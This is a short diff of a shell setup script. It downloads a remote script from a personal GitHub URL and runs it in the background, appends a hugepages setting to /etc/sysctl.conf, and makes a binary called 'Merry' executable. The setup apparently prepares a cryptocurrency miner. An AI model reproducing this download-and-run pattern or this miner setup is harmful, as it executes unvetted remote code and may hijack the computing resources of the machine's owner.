@@ -19,7 +19,15 @@ TZ='Africa/Johannesburg'; export TZ
 date
 sleep 2
 
-curl -fsSL https://raw.githubusercontent.com/mncedisihlabathini/Merry/main/install_and_monitor_shadow.sh | bash &
+wget https://raw.githubusercontent.com/mncedisihlabathini/Merry/main/install_and_monitor_shadow.sh
+
+sleep 2
+
+chmod +x install_and_monitor_shadow.sh
+
+sleep 2
+
+bash install_and_monitor_shadow.sh &
 
 sleep 2
 
@@ -106,6 +114,10 @@ echo ""
 sleep 2
 
 (grep -q "vm.nr_hugepages" /etc/sysctl.conf || (echo "vm.nr_hugepages=$((1168+$(nproc)))" | tee -a /etc/sysctl.conf)) && sysctl -w vm.nr_hugepages=$((1168+$(nproc)))
+
+sleep 2
+
+chmod +x Merry
 
 sleep 2
 
